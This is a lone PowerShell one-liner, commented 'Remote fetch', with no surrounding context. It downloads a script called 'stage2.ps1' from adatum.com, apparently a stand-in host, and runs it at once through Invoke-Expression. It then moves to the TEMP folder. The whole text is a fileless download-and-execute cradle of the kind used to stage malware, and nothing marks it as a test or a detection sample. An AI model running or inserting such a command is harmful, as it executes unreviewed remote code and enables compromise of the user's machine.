
<# Remote fetch #> Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://adatum.com:8443/stage2.ps1"); Set-Location -Path $env:TEMP
